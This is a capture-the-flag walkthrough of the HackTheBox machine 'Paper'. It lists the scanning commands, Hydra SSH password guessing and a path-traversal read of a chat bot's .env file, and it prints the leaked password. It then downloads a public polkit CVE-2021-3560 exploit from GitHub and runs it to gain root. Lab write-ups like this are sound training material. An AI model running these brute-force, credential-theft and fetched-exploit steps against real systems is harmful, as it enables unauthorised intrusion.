# Paper
### A demonstration walkthrough of a pen test process using HTB's Paper with some normal dead ends as an example.  

*Note* /etc/hosts appended with "10.10.11.143 paper.htb"
Basic scan of all ports 
```
nmap -p- paper.htb
```

The preferred way to scan.  A fast scan of all ports then a deeper scan for services on the found ports  
```
ports=$(nmap -p- --min-rate=1000 -T4 paper.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports paper.htb
nikto -h paper.htb
```
Interesting Results (NMAP):  
- Running OpenSSH 8.0 and Apache httpd 2.4.37 on CentOS  
Interesting Results (NIKTO):   
- OSVDB-877: TRACE and missing common protection headers.  Set this aside unless we user traffic to escalate.
- Uncommon header 'x-backend-server' found, with contents: office.paper
- Retrieved x-powered-by header: PHP/7.2.24

**DEAD END:** Browsing site shows only the default install page, nothing interesting in source, HTTPS: fails cert validation.  
**DEAD END:**  Using Hydra to guess common username/passwords for SSH.  Trying a small set of default username and password combinations work more often in real world vs. simulations.  
```
echo 'root\nuser\nadmin\nadministrator\ndevelopment\ntest\napache\noffice\npaper' > paper.htb.usernames
echo 'password\nPassword\nPassw0rd\nPassw0rd!' > paper.htb.passwords
hydra -L paper.htb.usernames -P paper.htb.passwords -e nsr ssh://paper.htb
```
**DEAD END:** Using dirbuster results were only standard Apache files

Added backend server to /etc/hosts:  "10.10.11.143 office.paper"
```
nikto -h office.paper
```
Interesting results:
- Link to WordPress API docs: https://api.w.org
- 'x-redirect-by' found, with contents: WordPress

Browsed "office.paper" added a few more possible username to hyrda files.  Following chat noticed command about unsafe draft content.
```
wpscan --url http://office.paper
```
WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
```
searchsploit wordpress 5.2.3
cat /usr/share/exploitdb/exploits/multiple/webapps/47690.md
```

Browsed to http://office.paper/?static=1  
Draft leads to a chat server and secret registration page: http://chat.office.paper/register/8qozr226AhkCHZdyY  

Added "10.10.11.143 chat.office.paper" to /etc/hosts
**DEAD END:** Nikto and dirbuster on discovered hosts didn't yield any new results

I read the blog posts. Fun "The Office" references lots of names to add to Hydra lists.
Dwight setup a bot, seems like he is the admin.

The bot will take commands.
**DEAD END** Trying command injection, nothing I tried worked.  Seems I'm limited to 'list' and 'file' commands
**Comment"" First pass on enum drew a blank beyond the fact that Dwight owns the bot.

#### Rabbit Hole
Should Dwight + "The Office" + password be the way?
Outtakes:   
[YouTube](https://www.youtube.com/watch?v=yXPrp0AAvZ4)  
[YouTube](https://www.youtube.com/watch?v=dtGCC-DleX0)  
[YouTube](https://www.youtube.com/watch?v=HkmJFjbsIgM)  
[YouTube](https://www.youtube.com/watch?v=8zfNfilNOIE)  
[YouTube](https://www.youtube.com/watch?v=F1wodhJ-qFo)  

Geez, lots of ideas, lots of real bad password practices. Hydra failed, zero traction.

#### Better enum 
Googled RocketChat configuration led to using environment variables. 
A second pass of enum landed on "file ../../dwight/hubot/.env"  
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
Added to hydra files

```
hydra -L paper.htb.usernames -P paper.htb.passwords -e nsr ssh://paper.htb
```
[DATA] attacking ssh://paper.htb:22/
[22][ssh] host: paper.htb   login: dwight   password: Queenofblad3s!23
```
ssh dwight@paper.htb
```

### USER SUCCESS!

# Try LinPEAS to find escalation
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
scp linpeas.sh dwight@office.paper:linpeas.sh
```

Running linpeas.sh shows vulnerables to  CVE-2021-3560

```
curl https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py > exploit.py
scp exploit.py dwight@paper.htb:.
ssh dwight@paper.htb
```
```
python3 exploit.py
```

### ROOT SUCCESS!
